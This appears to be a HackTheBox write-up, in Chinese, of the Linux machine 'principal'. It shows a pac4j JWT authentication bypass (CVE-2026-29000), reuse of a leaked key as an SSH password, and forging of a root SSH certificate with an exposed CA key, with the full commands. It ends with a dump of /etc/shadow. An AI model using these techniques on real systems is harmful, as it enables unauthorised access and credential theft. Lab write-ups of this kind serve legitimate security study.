---
title: principal-htb
published: 2026-08-03
description: 'HackTheBox principal Linux Medium'
image: ''
tags: [htb, linux, web, ssh, CA]
category: 'HTB-writeup'
draft: false 
lang: ''
---

# Recon
Nmap, 两个端口: `22, 8080`
```
22/tcp   open  ssh        syn-ack OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http-proxy syn-ack Jetty
```

# 8080 - Jetty
一个 CICD 管理页面
![8080-main-page](principal-8080-init.png)
密码重置功能仍在实现, 推测自行实现的 CICD 页面, 页面底部小字: <font color="#fac08f">v1.2.0 | Powered by pac4j</font>
对 `static/js/app.js` 进行分析, 有以下端点, 需要认证:
```js
const API_BASE = '';
const JWKS_ENDPOINT = '/api/auth/jwks';
const AUTH_ENDPOINT = '/api/auth/login';
const DASHBOARD_ENDPOINT = '/api/dashboard';
const USERS_ENDPOINT = '/api/users';
const SETTINGS_ENDPOINT = '/api/settings';
```

## TechSTack
```http
HTTP/1.1 200 OK
Date: Wed, 29 Jul 2026 11:00:13 GMT
Server: Jetty
X-Powered-By: pac4j-jwt/6.0.3
Content-Language: en-US
Content-Type: text/html;charset=utf-8
Content-Length: 6152
```
技术栈给出了版本信息: `pac4j-jwt/6.0.3`, 十分甚至九分有趣

## CVE-2026-29000
公开利用聚焦在 [CVE-2026-29000](https://github.com/alihussainzada/CVE-2026-29000-Python-PoC-pac4j-JWT-AuthenticationBypass-Poc) 上:

:::quote
 The vulnerability allows attackers to authenticate as arbitrary users by sending a malicious **JWE token containing an unsigned PlainJWT (`alg: none`)**.
:::

利用需要公开的 `JWKS` 公钥, 恰好 `const JWKS_ENDPOINT = '/api/auth/jwks';`
对于需要伪造的 body 字段其中也有提及:
```js
const ROLES = {
    ADMIN: 'ROLE_ADMIN',
    MANAGER: 'ROLE_MANAGER',
    USER: 'ROLE_USER'
};
```

```sh
python3 ./poc.py --jwks http://10.129.15.87:8080/api/auth/jwks --user admin --role ROLE_ADMIN
[*] Fetching JWKS...
[+] Public key loaded
[+] PlainJWT created

=== Malicious JWE Token ===

..too long..
```

## AfterAuth
对于 `/api/users` 端点, 其指出 `svc_deploy` 可以通过 ssh 登陆:
```json
{
	"active":true,
	"lastLogin":"2025-12-28T14:32:00Z",
	"id":2,
	"department":"DevOps",
	"displayName":"Deploy Service",
	"email":"svc-deploy@principal-corp.local",
	"username":"svc-deploy",
	"note":"Service account for automated deployments via SSH certificate auth.",
	"role":"deployer"
}
```
以及一个域名: `principal-corp.local`, 但 ffuf 未找到子域名

在 `/api/settings` 中发现了一些有趣的信息, 包括用于签名 JWT 的密钥
```json
{
"infrastructure":{
	"database":"H2 (embedded)",
	"sshCertAuth":"enabled",
	"sshCaPath":"/opt/principal/ssh/",
	"notes":"SSH certificate auth configured for automation - see /opt/principal/ssh/ for CA config."},
	
"security":{
	"authFramework":"pac4j-jwt",
	"authFrameworkVersion":"6.0.3",
	"jwtAlgorithm":"RS256",
	"jweAlgorithm":"RSA-OAEP-256",
	"jweEncryption":"A128GCM",
	"encryptionKey":"D3pl0y_$$H_Now42!",
	"tokenExpiry":"3600s",
	"sessionManagement":"stateless"
}
```
以及我们知道在 `/opt/principal/ssh/` 下存放着 SSH 的 CA 设置, 或许会有可以签名任意证书的根密钥

观察 JWT 密钥, 发现其和 DEPLOY 以及 SSH 等关键字有重复, 尝试 ssh
```sh
ssh svc-deploy@10.129.244.220
svc-deploy@10.129.244.220's password: 
'
svc-deploy@principal:~$ whoami
svc-deploy
```

# shell as svc_deploy 
权限以及用户情况
```sh
svc-deploy@principal:~$ id
uid=1001(svc-deploy) gid=1002(svc-deploy) groups=1002(svc-deploy),1001(deployers)
svc-deploy@principal:~$ cat /etc/passwd|grep sh
root:x:0:0:root:/root:/bin/bash
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
svc-deploy:x:1001:1002::/home/svc-deploy:/bin/bash
```

网络情况, 省略过多内容, 一张网卡, 无有趣的仅本地端口
```sh
svc-deploy@principal:~$ ss -lntp
127.0.0.54:53  
0.0.0.0:22 
127.0.0.53%lo:53
*:8080
[::]:22
svc-deploy@principal:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:32:2c brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    altname ens160
    inet 10.129.244.220/16 brd 10.129.255.255 scope global dynamic eth0
       valid_lft 3109sec preferred_lft 3109sec
```

两个用户, `root` 和 `svc-deploy`, 其中 `svc-deploy` 还属于 `deploy` 组, 查找该组拥有的文件或目录
```sh
svc-deploy@principal:~$ find / -group deployers -ls 2>/dev/null
      547      4 -rw-r-----   1 root     deployers      168 Mar 10 14:35 /etc/ssh/sshd_config.d/60-principal.conf
    20398      4 drwxr-x---   2 root     deployers     4096 Mar 11 04:22 /opt/principal/ssh
    20498      4 -rw-r-----   1 root     deployers      288 Mar  5 21:05 /opt/principal/ssh/README.txt
    20499      4 -rw-r-----   1 root     deployers     3381 Mar  5 21:05 /opt/principal/ssh/ca
```

这和在 Web 页面得到的信息相匹配

## SSH CA analyst
在 `/opt/principal/ssh` 下有 
```sh
svc-deploy@principal:/opt/principal/ssh$ ls
README.txt  ca  ca.pub
```

传输到本地, 对证书中间部分进行 base64 解码:
```sh
cat ssh_cakey|sed '1d;$d'|base64 -d|xxd
00000970: 6f8d 74e4 7cc5 3900 0000 1070 7269 6e63  o.t.|.9....princ
00000980: 6970 616c 2d73 7368 2d63 6101 0203       ipal-ssh-ca...
```

:::note
 https://github.com/vedetta-com/vedetta/blob/master/src/usr/local/share/doc/vedetta/OpenSSH_Principals.md?ref=benheater.com#certificate-authority
:::

显示这就是 CA 签名密钥, 使用该密钥签名一个针对 root 的私钥:
```sh
ssh-keygen -t ed25519 -f mykey.root
ssh-keygen -s ssh_cakey -I pwned -n root -V +1h mykey.root.pub
ssh -i mykey -o CertificateFile=mykey.root-cert.pub root@principal-corp.local
```

# R00t3d
```sh
root@principal:~# whoami
root
root@principal:~# id
uid=0(root) gid=(root) groups=0(root)
root@principal:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:1b:e8 brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    altname ens160
    inet 10.129.15.87/16 brd 10.129.255.255 scope global dynamic eth0
       valid_lft 2339sec preferred_lft 2339sec
root@principal:~# cat /etc/shadow
root:$y$j9T$xBgOh.jWzUeApicxtS7Qo0$J6.UrcvvOErkZUK/r2E4SZGKY2ltQ/ssABhF1SVMUoC:20518:0:99999:7:::
```